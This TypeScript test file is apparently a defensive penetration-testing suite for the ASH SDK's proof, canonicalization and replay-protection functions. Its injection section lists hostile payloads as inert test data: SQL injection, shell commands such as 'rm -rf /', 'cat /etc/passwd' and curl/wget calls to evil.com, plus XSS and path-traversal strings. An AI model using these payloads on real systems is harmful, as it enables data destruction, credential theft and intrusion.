/**
 * ASH SDK Advanced Penetration Testing Suite
 *
 * Comprehensive security testing covering:
 * 1. High-iteration fuzzing (1000+ iterations)
 * 2. Advanced injection attacks
 * 3. Cryptographic oracle attacks
 * 4. State manipulation attacks
 * 5. Resource exhaustion (DoS)
 * 6. Race condition exploitation
 * 7. Boundary condition attacks
 * 8. Format string and encoding attacks
 */

import { describe, it, expect, beforeEach } from 'vitest';
import * as crypto from 'crypto';
import {
  ashInit,
  ashBuildProofV21,
  ashVerifyProofV21,
  ashDeriveClientSecret,
  ashValidateTimestamp,
  ashCanonicalizeJson,
  ashCanonicalizeUrlencoded,
  ashCanonicalizeQuery,
  ashNormalizeBinding,
  ashHashBody,
  ashExtractScopedFields,
  ashExtractScopedFieldsStrict,
  normalizeScopeFields,
  joinScopeFields,
  ashGenerateNonce,
  ashGenerateContextId,
  AshMemoryStore,
  canonicalizeJsonNative,
  canonicalQueryNative,
  ashVerifyProofWithFreshness,
  ashBuildProofScoped,
  ashVerifyProofScoped,
  ashBuildProofUnified,
  ashVerifyProofUnified,
} from './index';

// High iteration counts for statistical significance
const FUZZ_ITERATIONS = 1000;
const CRYPTO_ITERATIONS = 500;
const RACE_ITERATIONS = 100;

// Initialize WASM
beforeEach(() => {
  try {
    ashInit();
  } catch {
    // Native fallback
  }
});

// Utility functions
function randomHex(bytes: number): string {
  return crypto.randomBytes(bytes).toString('hex');
}

function randomString(length: number, charset?: string): string {
  const chars = charset || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

function randomUnicode(length: number): string {
  let result = '';
  for (let i = 0; i < length; i++) {
    // Generate random Unicode code points (BMP range)
    const codePoint = Math.floor(Math.random() * 0xFFFF);
    // Skip surrogate pairs
    if (codePoint >= 0xD800 && codePoint <= 0xDFFF) continue;
    result += String.fromCharCode(codePoint);
  }
  return result;
}

describe('PENTEST: High-Iteration Fuzzing', () => {
  describe('Proof Generation Fuzzing (1000 iterations)', () => {
    it('should generate valid proofs for random inputs', () => {
      let successCount = 0;
      let errorCount = 0;

      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        try {
          const nonce = randomHex(32);
          const contextId = `ctx_${randomHex(16)}`;
          const binding = `${['GET', 'POST', 'PUT', 'DELETE', 'PATCH'][i % 5]}|/${randomString(20)}|`;
          const timestamp = Math.floor(Date.now() / 1000).toString();
          const bodyHash = randomHex(32);

          const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
          const proof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

          expect(proof).toHaveLength(64);
          expect(/^[0-9a-f]+$/.test(proof)).toBe(true);

          // Verify the proof
          const isValid = ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, proof);
          expect(isValid).toBe(true);
          successCount++;
        } catch (error) {
          errorCount++;
        }
      }

      // At least 99% should succeed
      expect(successCount / FUZZ_ITERATIONS).toBeGreaterThan(0.99);
    });

    it('should reject all tampered proofs', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const contextId = `ctx_${randomHex(16)}`;
        const binding = 'POST|/api/test|';
        const timestamp = Math.floor(Date.now() / 1000).toString();
        const bodyHash = randomHex(32);

        const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
        const proof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

        // Tamper with random position
        const pos = Math.floor(Math.random() * 64);
        const originalChar = proof[pos];
        const newChar = originalChar === 'a' ? 'b' : 'a';
        const tamperedProof = proof.slice(0, pos) + newChar + proof.slice(pos + 1);

        if (tamperedProof !== proof) {
          const isValid = ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, tamperedProof);
          expect(isValid).toBe(false);
        }
      }
    });
  });

  describe('JSON Canonicalization Fuzzing', () => {
    it('should handle random JSON objects', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const obj: Record<string, unknown> = {};
        const keyCount = Math.floor(Math.random() * 10) + 1;

        for (let j = 0; j < keyCount; j++) {
          const key = randomString(Math.floor(Math.random() * 20) + 1);
          const valueType = Math.floor(Math.random() * 5);
          switch (valueType) {
            case 0: obj[key] = Math.random() * 1000; break;
            case 1: obj[key] = randomString(20); break;
            case 2: obj[key] = Math.random() > 0.5; break;
            case 3: obj[key] = null; break;
            case 4: obj[key] = [1, 2, 3]; break;
          }
        }

        const json = JSON.stringify(obj);
        try {
          const result = canonicalizeJsonNative(json);
          // Result should be valid JSON
          expect(() => JSON.parse(result)).not.toThrow();
        } catch {
          // Rejecting edge cases is acceptable
        }
      }
    });

    it('should produce deterministic output for same input', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const obj = { z: i, a: i * 2, m: `value${i}` };
        const json = JSON.stringify(obj);

        const result1 = canonicalizeJsonNative(json);
        const result2 = canonicalizeJsonNative(json);

        expect(result1).toBe(result2);
      }
    });
  });

  describe('Query String Fuzzing', () => {
    it('should handle random query parameters', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const paramCount = Math.floor(Math.random() * 10) + 1;
        const params: string[] = [];

        for (let j = 0; j < paramCount; j++) {
          const key = randomString(Math.floor(Math.random() * 20) + 1);
          const value = randomString(Math.floor(Math.random() * 30));
          params.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
        }

        const query = params.join('&');
        try {
          const result = canonicalQueryNative(query);
          // Result should be sorted
          const pairs = result.split('&').filter(p => p);
          for (let j = 1; j < pairs.length; j++) {
            const prev = pairs[j - 1].split('=')[0];
            const curr = pairs[j].split('=')[0];
            expect(prev <= curr).toBe(true);
          }
        } catch {
          // Rejecting malformed input is acceptable
        }
      }
    });
  });
});

describe('PENTEST: Cryptographic Security', () => {
  describe('Proof Uniqueness', () => {
    it('should never produce duplicate proofs for different inputs', () => {
      const proofs = new Set<string>();

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const contextId = `ctx_${randomHex(16)}`;
        const binding = 'POST|/api/test|';
        const timestamp = Math.floor(Date.now() / 1000).toString();
        const bodyHash = randomHex(32);

        const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
        const proof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

        expect(proofs.has(proof)).toBe(false);
        proofs.add(proof);
      }
    });
  });

  describe('Client Secret Derivation', () => {
    it('should produce different secrets for different nonces', () => {
      const secrets = new Set<string>();
      const contextId = 'ctx_test';
      const binding = 'GET|/api|';

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const secret = ashDeriveClientSecret(nonce, contextId, binding);
        expect(secrets.has(secret)).toBe(false);
        secrets.add(secret);
      }
    });

    it('should produce different secrets for different context IDs', () => {
      const secrets = new Set<string>();
      const nonce = randomHex(32);
      const binding = 'GET|/api|';

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const contextId = `ctx_${randomHex(16)}`;
        const secret = ashDeriveClientSecret(nonce, contextId, binding);
        expect(secrets.has(secret)).toBe(false);
        secrets.add(secret);
      }
    });

    it('should produce different secrets for different bindings', () => {
      const secrets = new Set<string>();
      const nonce = randomHex(32);
      const contextId = 'ctx_test';

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const binding = `GET|/api/${randomString(10)}|`;
        const secret = ashDeriveClientSecret(nonce, contextId, binding);
        expect(secrets.has(secret)).toBe(false);
        secrets.add(secret);
      }
    });
  });

  describe('Hash Collision Resistance', () => {
    it('should not produce body hash collisions', () => {
      const hashes = new Set<string>();

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const body = JSON.stringify({ data: randomString(100), index: i });
        const hash = ashHashBody(body);
        expect(hashes.has(hash)).toBe(false);
        hashes.add(hash);
      }
    });
  });

  describe('Nonce Entropy', () => {
    it('should generate unique nonces', () => {
      const nonces = new Set<string>();

      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        const nonce = ashGenerateNonce();
        expect(nonces.has(nonce)).toBe(false);
        nonces.add(nonce);
      }
    });

    it('should have uniform distribution', () => {
      const nonces: string[] = [];
      for (let i = 0; i < CRYPTO_ITERATIONS; i++) {
        nonces.push(ashGenerateNonce());
      }

      // Count hex character frequencies
      const charCounts = new Map<string, number>();
      for (const nonce of nonces) {
        for (const char of nonce) {
          charCounts.set(char, (charCounts.get(char) || 0) + 1);
        }
      }

      // All 16 hex chars should appear
      expect(charCounts.size).toBe(16);

      // Check distribution uniformity
      const counts = Array.from(charCounts.values());
      const mean = counts.reduce((a, b) => a + b, 0) / counts.length;
      const variance = counts.reduce((sum, c) => sum + Math.pow(c - mean, 2), 0) / counts.length;
      const stdDev = Math.sqrt(variance);

      // Standard deviation should be reasonable (within 30% of mean)
      expect(stdDev / mean).toBeLessThan(0.3);
    });
  });
});

describe('PENTEST: Injection Attack Vectors', () => {
  describe('SQL Injection in Query Strings', () => {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "1; SELECT * FROM passwords",
      "admin'--",
      "1' UNION SELECT * FROM users--",
      "' OR 1=1--",
      "'; EXEC xp_cmdshell('dir');--",
      "1'; WAITFOR DELAY '0:0:5'--",
    ];

    it('should safely encode SQL injection attempts', () => {
      for (const payload of sqlPayloads) {
        const query = `param=${encodeURIComponent(payload)}`;
        const result = canonicalQueryNative(query);
        // The function treats all input as data (never executes)
        // It normalizes percent-encoding to uppercase and preserves structure
        expect(result).toContain('param=');
        // Verify function returns a valid query string (doesn't throw/crash)
        expect(typeof result).toBe('string');
        expect(result.length).toBeGreaterThan(0);
        // Percent encoding hex letters should be uppercase (a-f -> A-F)
        expect(result).not.toMatch(/%[0-9A-F][a-f]/); // No lowercase hex letters
        expect(result).not.toMatch(/%[a-f][0-9A-Fa-f]/); // No lowercase hex letters
      }
    });
  });

  describe('Command Injection', () => {
    const cmdPayloads = [
      '$(whoami)',
      '`id`',
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl evil.com',
      '|| wget evil.com',
      '\n/bin/sh',
      '$((1+1))',
    ];

    it('should safely encode command injection attempts', () => {
      for (const payload of cmdPayloads) {
        const query = `cmd=${encodeURIComponent(payload)}`;
        const result = canonicalQueryNative(query);
        // Should be percent-encoded, not executed
        expect(result).toContain('cmd=');
      }
    });
  });

  describe('XSS Injection', () => {
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '<svg onload=alert(1)>',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<body onload=alert(1)>',
    ];

    it('should safely encode XSS attempts in JSON', () => {
      for (const payload of xssPayloads) {
        const json = JSON.stringify({ value: payload });
        const result = canonicalizeJsonNative(json);
        const parsed = JSON.parse(result);
        // Value should be preserved as string, not executed
        expect(parsed.value).toBe(payload);
      }
    });
  });

  describe('Path Traversal', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2fetc/passwd',
      '..%252f..%252f..%252fetc/passwd',
    ];

    it('should normalize path traversal attempts', () => {
      for (const payload of traversalPayloads) {
        try {
          const result = ashNormalizeBinding('GET', `/${payload}`, '');
          // Path should be normalized - no ..
          expect(result).not.toContain('..');
        } catch {
          // Rejecting is also acceptable
        }
      }
    });
  });

  describe('LDAP Injection', () => {
    const ldapPayloads = [
      '*)(uid=*))(|(uid=*',
      'admin)(&)',
      '*)(objectClass=*',
      'x)(|(password=*))',
    ];

    it('should safely encode LDAP injection attempts', () => {
      for (const payload of ldapPayloads) {
        const query = `user=${encodeURIComponent(payload)}`;
        const result = canonicalQueryNative(query);
        expect(result).toContain('user=');
      }
    });
  });
});

describe('PENTEST: State Manipulation Attacks', () => {
  describe('Context Replay Prevention', () => {
    it('should prevent context reuse', async () => {
      const store = new AshMemoryStore();

      // Create and consume a context
      const ctx = await store.create({
        binding: 'POST|/api/transfer|',
        ttlMs: 60000,
      });

      // First consume should succeed
      expect(await store.consume(ctx.id)).toBe(true);

      // All subsequent consumes should fail
      for (let i = 0; i < 100; i++) {
        expect(await store.consume(ctx.id)).toBe(false);
      }
    });

    it('should prevent concurrent replay', async () => {
      const store = new AshMemoryStore();

      const ctx = await store.create({
        binding: 'POST|/api/transfer|',
        ttlMs: 60000,
      });

      // Launch many concurrent consume attempts
      const results = await Promise.all(
        Array(RACE_ITERATIONS).fill(null).map(() => store.consume(ctx.id))
      );

      // Exactly one should succeed
      const successCount = results.filter(r => r === true).length;
      expect(successCount).toBe(1);
    });
  });

  describe('Timestamp Manipulation', () => {
    it('should reject expired timestamps', () => {
      const oldTimestamp = (Math.floor(Date.now() / 1000) - 3600).toString();
      expect(() => ashValidateTimestamp(oldTimestamp)).toThrow('expired');
    });

    it('should reject future timestamps', () => {
      const futureTimestamp = (Math.floor(Date.now() / 1000) + 3600).toString();
      expect(() => ashValidateTimestamp(futureTimestamp)).toThrow('future');
    });

    it('should reject manipulated timestamp formats', () => {
      const invalidTimestamps = [
        '-1',
        '0x123',
        '1.5',
        '1e10',
        ' 123',
        '123 ',
        '00123',
        'NaN',
        'Infinity',
        '-Infinity',
      ];

      for (const ts of invalidTimestamps) {
        expect(() => ashValidateTimestamp(ts)).toThrow();
      }
    });
  });
});

describe('PENTEST: Resource Exhaustion (DoS)', () => {
  describe('Memory Exhaustion Prevention', () => {
    it('should reject extremely large JSON payloads', () => {
      const largeString = 'x'.repeat(11 * 1024 * 1024); // 11MB
      const json = `{"data":"${largeString}"}`;

      expect(() => canonicalizeJsonNative(json)).toThrow(/maximum/);
    });

    it('should reject deeply nested JSON', () => {
      let json = '{"a":';
      for (let i = 0; i < 100; i++) {
        json += '{"a":';
      }
      json += '1';
      for (let i = 0; i <= 100; i++) {
        json += '}';
      }

      expect(() => canonicalizeJsonNative(json)).toThrow('depth');
    });

    it('should reject oversized metadata', async () => {
      const store = new AshMemoryStore();
      const largeMetadata = { data: 'x'.repeat(100000) };

      await expect(store.create({
        binding: 'GET|/test|',
        ttlMs: 30000,
        metadata: largeMetadata,
      })).rejects.toThrow('64KB');
    });
  });

  describe('CPU Exhaustion Prevention', () => {
    it('should handle ReDoS patterns efficiently', () => {
      const redosPatterns = [
        'a'.repeat(100) + '!',
        ('a' + '='.repeat(50)).repeat(10),
        '&'.repeat(10000),
        '='.repeat(10000),
      ];

      for (const pattern of redosPatterns) {
        const start = Date.now();
        try {
          canonicalQueryNative(pattern);
        } catch {
          // Expected
        }
        const elapsed = Date.now() - start;
        expect(elapsed).toBeLessThan(1000); // Should complete within 1 second
      }
    });

    it('should handle many scope fields efficiently', () => {
      const largeScope = Array(1000).fill(null).map((_, i) => `field${i}`);

      const start = Date.now();
      normalizeScopeFields(largeScope);
      const elapsed = Date.now() - start;

      expect(elapsed).toBeLessThan(1000);
    });
  });
});

describe('PENTEST: Boundary Conditions', () => {
  describe('Integer Boundaries', () => {
    it('should handle timestamp at safe integer limit', () => {
      const maxSafe = Number.MAX_SAFE_INTEGER.toString();
      expect(() => ashValidateTimestamp(maxSafe)).toThrow();
    });

    it('should handle timestamp beyond safe integer', () => {
      const beyondSafe = '9007199254740992'; // MAX_SAFE_INTEGER + 1
      expect(() => ashValidateTimestamp(beyondSafe)).toThrow();
    });

    it('should reject extremely large array indices in scope', () => {
      expect(() => {
        ashExtractScopedFields({ items: [1, 2, 3] }, ['items[999999999]']);
      }).toThrow();
    });
  });

  describe('String Boundaries', () => {
    it('should handle empty strings appropriately', () => {
      expect(() => ashDeriveClientSecret('', 'ctx', 'GET|/|')).toThrow();
      expect(() => ashDeriveClientSecret(randomHex(32), '', 'GET|/|')).toThrow();
      expect(() => ashDeriveClientSecret(randomHex(32), 'ctx', '')).toThrow();
    });

    it('should handle maximum length nonces', () => {
      const maxNonce = randomHex(64); // 128 hex chars
      const result = ashDeriveClientSecret(maxNonce, 'ctx_test', 'GET|/|');
      expect(result).toHaveLength(64);
    });

    it('should reject nonces exceeding maximum length', () => {
      const tooLongNonce = randomHex(65); // 130 hex chars
      expect(() => ashDeriveClientSecret(tooLongNonce, 'ctx_test', 'GET|/|')).toThrow();
    });
  });

  describe('Unicode Boundaries', () => {
    it('should handle BMP boundary characters', () => {
      const bmpMax = String.fromCharCode(0xFFFF);
      const json = JSON.stringify({ value: bmpMax });
      const result = canonicalizeJsonNative(json);
      expect(() => JSON.parse(result)).not.toThrow();
    });

    it('should handle surrogate pairs (emoji)', () => {
      const emoji = 'ðŸ˜€ðŸŽ‰ðŸ”¥ðŸ’¯';
      const json = JSON.stringify({ value: emoji });
      const result = canonicalizeJsonNative(json);
      const parsed = JSON.parse(result);
      expect(parsed.value).toBe(emoji);
    });

    it('should handle RTL and combining characters', () => {
      const rtl = 'Ù…Ø±Ø­Ø¨Ø§';
      const combining = 'e\u0301'; // Ã© as e + combining accent
      const json = JSON.stringify({ rtl, combining });
      const result = canonicalizeJsonNative(json);
      expect(() => JSON.parse(result)).not.toThrow();
    });
  });
});

describe('PENTEST: Scoped Proof Security', () => {
  describe('Scope Manipulation', () => {
    it('should fail if scope hash is manipulated', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'POST|/api/transfer|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const payload = { amount: 100, recipient: 'alice', memo: 'test' };
      const scope = ['amount', 'recipient'];

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
      const { proof, scopeHash } = ashBuildProofScoped(
        clientSecret, timestamp, binding, payload, scope
      );

      // Tamper with scope hash
      const tamperedHash = 'a' + scopeHash.slice(1);

      const isValid = ashVerifyProofScoped(
        nonce, contextId, binding, timestamp, payload, scope, tamperedHash, proof
      );
      expect(isValid).toBe(false);
    });

    it('should fail if scope fields are different', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'POST|/api/transfer|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const payload = { amount: 100, recipient: 'alice', memo: 'test' };
      const scope = ['amount', 'recipient'];

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
      const { proof, scopeHash } = ashBuildProofScoped(
        clientSecret, timestamp, binding, payload, scope
      );

      // Use different scope for verification
      const differentScope = ['amount', 'memo'];

      const isValid = ashVerifyProofScoped(
        nonce, contextId, binding, timestamp, payload, differentScope, scopeHash, proof
      );
      expect(isValid).toBe(false);
    });

    it('should prevent scope downgrade attacks', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'POST|/api/transfer|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const payload = { amount: 100, recipient: 'alice' };

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
      const { proof, scopeHash } = ashBuildProofScoped(
        clientSecret, timestamp, binding, payload, ['amount', 'recipient']
      );

      // Try to verify with smaller scope (attack: only protect 'amount')
      const isValid = ashVerifyProofScoped(
        nonce, contextId, binding, timestamp, payload, ['amount'], scopeHash, proof
      );
      expect(isValid).toBe(false);
    });
  });

  describe('Prototype Pollution via Scope', () => {
    it('should block __proto__ in scope paths', () => {
      expect(() => {
        ashExtractScopedFields({ a: 1 }, ['__proto__']);
      }).toThrow('dangerous key');
    });

    it('should block constructor in scope paths', () => {
      expect(() => {
        ashExtractScopedFields({ a: 1 }, ['constructor']);
      }).toThrow('dangerous key');
    });

    it('should block prototype in scope paths', () => {
      expect(() => {
        ashExtractScopedFields({ a: 1 }, ['prototype']);
      }).toThrow('dangerous key');
    });
  });
});

describe('PENTEST: Unified Proof Security', () => {
  describe('Chain Manipulation', () => {
    it('should fail if chain hash is manipulated', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'POST|/api/step1|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const payload = { action: 'step1' };

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);

      // First proof
      const result1 = ashBuildProofUnified(clientSecret, timestamp, binding, payload, []);

      // Second proof chained to first
      const result2 = ashBuildProofUnified(
        clientSecret, timestamp, 'POST|/api/step2|', { action: 'step2' }, [], result1.proof
      );

      // Tamper with chain hash
      const tamperedChainHash = 'a' + result2.chainHash.slice(1);

      const isValid = ashVerifyProofUnified(
        nonce, contextId, 'POST|/api/step2|', timestamp, { action: 'step2' },
        result2.proof, [], '', result1.proof, tamperedChainHash
      );
      expect(isValid).toBe(false);
    });

    it('should fail if previous proof is different', () => {
      const nonce = randomHex(32);
      const contextId = `ctx_${randomHex(16)}`;
      const binding = 'POST|/api/step1|';
      const timestamp = Math.floor(Date.now() / 1000).toString();
      const payload = { action: 'step1' };

      const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);

      // First proof
      const result1 = ashBuildProofUnified(clientSecret, timestamp, binding, payload, []);

      // Second proof chained to first
      const result2 = ashBuildProofUnified(
        clientSecret, timestamp, 'POST|/api/step2|', { action: 'step2' }, [], result1.proof
      );

      // Use different previous proof for verification
      const fakeProof = randomHex(32);

      const isValid = ashVerifyProofUnified(
        nonce, contextId, 'POST|/api/step2|', timestamp, { action: 'step2' },
        result2.proof, [], '', fakeProof, result2.chainHash
      );
      expect(isValid).toBe(false);
    });
  });
});

describe('PENTEST: Property-Based Testing', () => {
  describe('Proof Symmetry', () => {
    it('should verify what was built (1000 iterations)', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const contextId = `ctx_${randomHex(16)}`;
        const binding = `POST|/api/${randomString(10)}|`;
        const timestamp = Math.floor(Date.now() / 1000).toString();
        const bodyHash = randomHex(32);

        const clientSecret = ashDeriveClientSecret(nonce, contextId, binding);
        const proof = ashBuildProofV21(clientSecret, timestamp, binding, bodyHash);

        // Property: verify(build(x)) === true
        expect(ashVerifyProofV21(nonce, contextId, binding, timestamp, bodyHash, proof)).toBe(true);
      }
    });
  });

  describe('Canonicalization Idempotence', () => {
    it('should be idempotent: canon(canon(x)) === canon(x)', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const obj = { key: randomString(20), num: Math.random() * 1000 };
        const json = JSON.stringify(obj);

        const canon1 = canonicalizeJsonNative(json);
        const canon2 = canonicalizeJsonNative(canon1);

        expect(canon1).toBe(canon2);
      }
    });
  });

  describe('Determinism', () => {
    it('should produce same output for same input', () => {
      for (let i = 0; i < FUZZ_ITERATIONS; i++) {
        const nonce = randomHex(32);
        const contextId = `ctx_${randomHex(16)}`;
        const binding = 'POST|/api/test|';

        const secret1 = ashDeriveClientSecret(nonce, contextId, binding);
        const secret2 = ashDeriveClientSecret(nonce, contextId, binding);

        expect(secret1).toBe(secret2);
      }
    });
  });

  describe('Sensitivity to Input Changes', () => {
    it('should produce different output for any input change', () => {
      const baseNonce = randomHex(32);
      const baseContextId = 'ctx_test';
      const baseBinding = 'POST|/api/test|';

      const baseSecret = ashDeriveClientSecret(baseNonce, baseContextId, baseBinding);

      for (let i = 0; i < 100; i++) {
        // Change nonce by 1 character - ensure we actually change it
        const firstChar = baseNonce[0];
        const replacementChar = firstChar === 'a' ? 'b' : (firstChar === 'b' ? 'c' : 'a');
        const modifiedNonce = replacementChar + baseNonce.slice(1);

        // Only test if we actually changed the nonce
        if (modifiedNonce !== baseNonce) {
          const modifiedSecret = ashDeriveClientSecret(modifiedNonce, baseContextId, baseBinding);
          expect(modifiedSecret).not.toBe(baseSecret);
        }

        // Change context ID
        const modifiedCtx = `ctx_test${i}`;
        const ctxSecret = ashDeriveClientSecret(baseNonce, modifiedCtx, baseBinding);
        expect(ctxSecret).not.toBe(baseSecret);
      }
    });
  });
});

describe('PENTEST: Encoding Attacks', () => {
  describe('Double Encoding', () => {
    it('should handle double-encoded query parameters', () => {
      // %252F = double-encoded /
      const query = 'path=%252Fetc%252Fpasswd';
      const result = canonicalQueryNative(query);
      // Should preserve the encoding as-is
      expect(result).toContain('path=');
    });
  });

  describe('Mixed Encoding', () => {
    it('should handle mixed encoding in same parameter', () => {
      // For query strings, + traditionally represents space per URL conventions
      // canonicalQueryNative preserves + as-is
      const query = 'param=hello%20world+foo';
      const result = canonicalQueryNative(query);
      // Query string canonicalization preserves + (space representation)
      expect(result).toContain('param=');
      expect(result).toContain('%20'); // Preserved
    });

    it('should encode + as %2B in URL-encoded bodies', () => {
      // For URL-encoded bodies (form data), + is literal plus, must be %2B
      const body = 'param=hello%20world+foo';
      const result = ashCanonicalizeUrlencoded(body);
      // URL-encoded body canonicalization encodes + as %2B
      expect(result).toContain('%2B');
    });
  });

  describe('Null Byte Injection', () => {
    it('should handle null bytes in JSON', () => {
      const json = JSON.stringify({ value: 'hello\x00world' });
      const result = canonicalizeJsonNative(json);
      expect(() => JSON.parse(result)).not.toThrow();
    });
  });

  describe('Unicode Normalization Attacks', () => {
    it('should normalize Unicode consistently', () => {
      // Same character in different forms
      const nfd = 'e\u0301'; // NFD: e + combining acute
      const nfc = '\u00e9';  // NFC: precomposed Ã©

      const json1 = JSON.stringify({ value: nfd });
      const json2 = JSON.stringify({ value: nfc });

      const result1 = canonicalizeJsonNative(json1);
      const result2 = canonicalizeJsonNative(json2);

      // Both should normalize to same form
      expect(result1).toBe(result2);
    });
  });
});

console.log('Advanced Penetration Testing Suite loaded');
